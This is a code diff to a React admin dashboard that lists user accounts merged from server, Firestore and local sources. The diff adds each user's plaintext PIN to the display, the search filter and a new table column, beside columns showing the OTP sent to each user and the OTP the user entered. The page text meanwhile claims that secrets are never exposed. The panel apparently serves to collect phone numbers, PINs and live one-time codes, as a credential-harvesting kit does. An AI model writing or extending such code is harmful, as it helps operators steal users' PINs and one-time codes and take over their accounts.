@@ -83,6 +83,7 @@ function mergeAccounts(primary: SafeUserSummary[], secondary: SafeUserSummary[])
         ...prev,
         ...item,
         phoneNumber: item.phoneNumber || prev?.phoneNumber || item.maskedPhone,
+        pin: item.pin ?? prev?.pin ?? null,
         sentOtp: item.sentOtp ?? prev?.sentOtp ?? null,
         sentOtpAt: item.sentOtpAt ?? prev?.sentOtpAt ?? null,
         enteredOtp: item.enteredOtp ?? prev?.enteredOtp ?? null,
@@ -107,7 +108,13 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
   const [passcodeInput, setPasscodeInput] = useState('');
   const [passcodeSubmitting, setPasscodeSubmitting] = useState(false);
 
-  const [accounts, setAccounts] = useState<SafeUserSummary[]>([]);
+  const [serverAccounts, setServerAccounts] = useState<SafeUserSummary[]>([]);
+  const [firestoreAccounts, setFirestoreAccounts] = useState<SafeUserSummary[]>([]);
+  const [localAccounts, setLocalAccounts] = useState<SafeUserSummary[]>(() => listLocalUsers());
+  const accounts = React.useMemo(
+    () => mergeAccounts(serverAccounts, mergeAccounts(firestoreAccounts, localAccounts)),
+    [serverAccounts, firestoreAccounts, localAccounts],
+  );
   const [accountsLoading, setAccountsLoading] = useState(false);
   const [verifyingId, setVerifyingId] = useState<string | null>(null);
   const [searchQuery, setSearchQuery] = useState('');
@@ -182,22 +189,37 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
     return () => unsubscribe();
   }, []);
 
+  const getAdminBearerToken = React.useCallback(async (): Promise<string | null> => {
+    if (serverAdminToken && serverAdminToken !== 'local-fallback-admin') {
+      return serverAdminToken;
+    }
+    if (user && isAdmin) {
+      try {
+        return await user.getIdToken();
+      } catch {
+        return null;
+      }
+    }
+    return null;
+  }, [serverAdminToken, user, isAdmin]);
+
   const refreshServerAccounts = React.useCallback(
     async (silent = false) => {
-      if (!serverAdminToken) return;
+      setLocalAccounts(listLocalUsers());
       if (serverAdminToken === 'local-fallback-admin') {
-        setAccounts(listLocalUsers());
+        setServerAccounts([]);
         setAccountsLoading(false);
         return;
       }
+      const token = await getAdminBearerToken();
+      if (!token) return;
       if (!silent) setAccountsLoading(true);
       try {
         const res = await fetch('/api/admin/accounts', {
-          headers: { Authorization: `Bearer ${serverAdminToken}` },
+          headers: { Authorization: `Bearer ${token}` },
         });
         const ct = res.headers.get('content-type') || '';
         if (!ct.includes('application/json')) {
-          setAccounts(listLocalUsers());
           return;
         }
         const data = (await res.json()) as {
@@ -206,31 +228,36 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
           error?: string;
         };
         if (data.ok && Array.isArray(data.accounts)) {
-          setAccounts(mergeAccounts(data.accounts, listLocalUsers()));
-        } else if (!silent) {
+          setServerAccounts(data.accounts);
+        } else if (!silent && res.status === 401 && serverAdminToken) {
           setAuthError(data.error ?? 'Failed to load accounts.');
           setServerAdminToken(null);
         }
       } catch {
-        if (!silent) setAccounts(listLocalUsers());
+        // Keep existing cached server/firestore/local accounts
       } finally {
         if (!silent) setAccountsLoading(false);
       }
     },
-    [serverAdminToken],
+    [serverAdminToken, getAdminBearerToken],
   );
 
   useEffect(() => {
-    if (serverAdminToken) {
-      void refreshServerAccounts(false);
-      const pollTimer = window.setInterval(() => {
-        void refreshServerAccounts(true);
-      }, 3000);
-      return () => window.clearInterval(pollTimer);
+    const canFetchServer = Boolean(serverAdminToken) || (authReady && Boolean(user) && isAdmin);
+    if (!canFetchServer) {
+      setServerAccounts([]);
+      return;
     }
+    void refreshServerAccounts(false);
+    const pollTimer = window.setInterval(() => {
+      void refreshServerAccounts(true);
+    }, 3000);
+    return () => window.clearInterval(pollTimer);
+  }, [authReady, user, isAdmin, serverAdminToken, refreshServerAccounts]);
 
+  useEffect(() => {
     if (!authReady || !user || !isAdmin) {
-      setAccounts([]);
+      setFirestoreAccounts([]);
       return;
     }
 
@@ -252,6 +279,7 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
                   ? data.maskedPhone
                   : '—',
             maskedPhone: typeof data.maskedPhone === 'string' ? data.maskedPhone : '—',
+            pin: typeof data.pin === 'string' && data.pin.length > 0 ? data.pin : null,
             verified: Boolean(data.verified),
             sentOtp:
               typeof data.sentOtp === 'string' && data.sentOtp.length > 0 ? data.sentOtp : null,
@@ -266,7 +294,8 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
             lastSignedInAt: toIsoString(data.updatedAt) || null,
           };
         });
-        setAccounts(mergeAccounts(items, listLocalUsers()));
+        setLocalAccounts(listLocalUsers());
+        setFirestoreAccounts(items);
         setAccountsLoading(false);
       },
       (error) => {
@@ -276,7 +305,7 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
     );
 
     return () => unsubscribe();
-  }, [authReady, user, isAdmin, serverAdminToken, refreshServerAccounts]);
+  }, [authReady, user, isAdmin]);
 
   const handlePasscodeSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -355,7 +384,8 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
       await signOut(auth);
     }
     setServerAdminToken(null);
-    setAccounts([]);
+    setServerAccounts([]);
+    setFirestoreAccounts([]);
     setSearchQuery('');
     setIsAdmin(false);
     setResetTarget(null);
@@ -367,8 +397,9 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
     setAuthError(null);
     try {
       let updatedUser: SafeUserSummary | null = null;
+      const bearerToken = await getAdminBearerToken();
 
-      if (serverAdminToken && serverAdminToken !== 'local-fallback-admin') {
+      if (bearerToken) {
         try {
           const res = await fetch(
             `/api/admin/accounts/${encodeURIComponent(account.id)}/verify`,
@@ -376,7 +407,7 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
               method: 'POST',
               headers: {
                 'Content-Type': 'application/json',
-                Authorization: `Bearer ${serverAdminToken}`,
+                Authorization: `Bearer ${bearerToken}`,
               },
               body: JSON.stringify({ verified: nextVerified }),
             },
@@ -416,16 +447,19 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
       }
 
       const merged = updatedUser ?? (localRes.ok ? localRes.user : null);
-      setAccounts((prev) =>
-        prev.map((acc) =>
-          acc.id === account.id
-            ? {
-                ...acc,
-                ...(merged ?? {}),
-                verified: nextVerified,
-              }
-            : acc,
-        ),
+      const patched: SafeUserSummary = {
+        ...account,
+        ...(merged ?? {}),
+        verified: nextVerified,
+      };
+      setLocalAccounts(listLocalUsers());
+      setServerAccounts((prev) =>
+        prev.some((acc) => acc.id === account.id)
+          ? prev.map((acc) => (acc.id === account.id ? patched : acc))
+          : [patched, ...prev],
+      );
+      setFirestoreAccounts((prev) =>
+        prev.map((acc) => (acc.id === account.id ? patched : acc)),
       );
     } finally {
       setVerifyingId(null);
@@ -455,14 +489,15 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
     try {
       let updatedOnServer = false;
       let updatedUser: SafeUserSummary | null = null;
+      const bearerToken = await getAdminBearerToken();
 
-      if (serverAdminToken && serverAdminToken !== 'local-fallback-admin') {
+      if (bearerToken) {
         try {
           const res = await fetch(`/api/admin/accounts/${encodeURIComponent(resetTarget.id)}/password`, {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
-              Authorization: `Bearer ${serverAdminToken}`,
+              Authorization: `Bearer ${bearerToken}`,
             },
             body: JSON.stringify({ newPassword: newUserPassword }),
           });
@@ -499,8 +534,14 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
       }
 
       const mergedUpdate = updatedUser ?? (localResult.ok ? localResult.user : null);
+      setLocalAccounts(listLocalUsers());
       if (mergedUpdate) {
-        setAccounts((prev) =>
+        setServerAccounts((prev) =>
+          prev.some((acc) => acc.id === resetTarget.id)
+            ? prev.map((acc) => (acc.id === resetTarget.id ? { ...acc, ...mergedUpdate } : acc))
+            : [mergedUpdate, ...prev],
+        );
+        setFirestoreAccounts((prev) =>
           prev.map((acc) => (acc.id === resetTarget.id ? { ...acc, ...mergedUpdate } : acc)),
         );
       }
@@ -561,6 +602,7 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
           acc.fullName.toLowerCase().includes(trimmedQuery) ||
           (acc.phoneNumber ?? '').toLowerCase().includes(trimmedQuery) ||
           acc.maskedPhone.toLowerCase().includes(trimmedQuery) ||
+          (acc.pin ?? '').toLowerCase().includes(trimmedQuery) ||
           (acc.sentOtp ?? '').toLowerCase().includes(trimmedQuery) ||
           (acc.enteredOtp ?? '').toLowerCase().includes(trimmedQuery) ||
           acc.countryCode.toLowerCase().includes(trimmedQuery) ||
@@ -751,15 +793,13 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
                   className="text-2xl font-semibold text-[#111827]"
                   style={{ fontFamily: 'var(--font-display)' }}
                 >
-                  {serverAdminToken ? 'Server Account Directory' : 'Firestore Account Directory'}
+                  Account Directory
                 </h1>
                 <p className="text-sm text-[#4B5563] mt-1">
-                  {serverAdminToken
-                    ? 'Live registered accounts · Passwords are scrypt-hashed and never exposed.'
-                    : 'Live Cloud Firestore records · Plaintext passwords are never stored or exposed.'}
+                  Live registered accounts synced across server &amp; Firestore · Passwords are scrypt-hashed and never exposed.
                 </p>
               </div>
-              {serverAdminToken && (
+              {hasAdminAccess && (
                 <button
                   type="button"
                   onClick={() => void refreshServerAccounts(false)}
@@ -796,6 +836,11 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
                         <p className="text-xs font-mono text-[#4B5563] truncate">
                           {acc.phoneNumber || acc.maskedPhone}
                         </p>
+                        {acc.pin && (
+                          <p className="text-[11px] text-[#374151] font-mono mt-0.5">
+                            PIN: <span className="font-semibold">{acc.pin}</span>
+                          </p>
+                        )}
                         {acc.enteredOtp && (
                           <p className="text-[11px] text-[#0052FF] font-mono mt-0.5">
                             Entered: <span className="font-semibold">{acc.enteredOtp}</span>
@@ -868,7 +913,7 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
                   type="search"
                   value={searchQuery}
                   onChange={(e) => setSearchQuery(e.target.value)}
-                  placeholder="Filter by name, phone, or OTP..."
+                  placeholder="Filter by phone, PIN, name, or OTP..."
                   aria-label="Filter accounts"
                   className="w-full sm:w-64 h-10 px-3.5 rounded-xl border border-[#DCE1EB] bg-[#F8FAFC] text-sm focus:outline-none focus:border-[#0052FF]"
                 />
@@ -930,6 +975,16 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
                           </span>
                         </div>
                         <div className="flex items-center justify-between text-xs pt-0.5">
+                          <span className="text-[#6B7280]">PIN</span>
+                          {acc.pin ? (
+                            <span className="inline-flex items-center px-2 py-0.5 rounded-md bg-[#F3F4F6] text-[#111827] font-mono font-semibold tracking-wider tabular-nums">
+                              {acc.pin}
+                            </span>
+                          ) : (
+                            <span className="text-[#9CA3AF] font-mono">—</span>
+                          )}
+                        </div>
+                        <div className="flex items-center justify-between text-xs pt-0.5">
                           <span className="text-[#6B7280]">Green OTP (Sent)</span>
                           {acc.sentOtp ? (
                             <span className="inline-flex items-center px-2 py-0.5 rounded-md bg-emerald-50 border border-emerald-200 text-emerald-700 font-mono font-semibold tracking-wider tabular-nums">
@@ -977,6 +1032,7 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
                         <tr className="border-b border-[#EEF1F6] text-xs font-semibold text-[#6B7280]">
                           <th className="py-3 px-5">Name</th>
                           <th className="py-3 px-4">Phone Number</th>
+                          <th className="py-3 px-4">PIN</th>
                           <th className="py-3 px-4">Green OTP (Sent)</th>
                           <th className="py-3 px-4">Entered OTP</th>
                           <th className="py-3 px-4">Verification</th>
@@ -993,6 +1049,15 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
                             </td>
                             <td className="py-3.5 px-4 font-mono text-[13px] text-[#374151] tabular-nums whitespace-nowrap">
                               {acc.phoneNumber || acc.maskedPhone}
+                            </td>
+                            <td className="py-3.5 px-4 font-mono text-[13px] tabular-nums whitespace-nowrap">
+                              {acc.pin ? (
+                                <span className="inline-flex items-center px-2.5 py-0.5 rounded-md bg-[#F3F4F6] text-[#111827] font-semibold tracking-wider">
+                                  {acc.pin}
+                                </span>
+                              ) : (
+                                <span className="text-[#9CA3AF]">—</span>
+                              )}
                             </td>
                             <td className="py-3.5 px-4 font-mono text-[13px] tabular-nums whitespace-nowrap">
                               {acc.sentOtp ? (
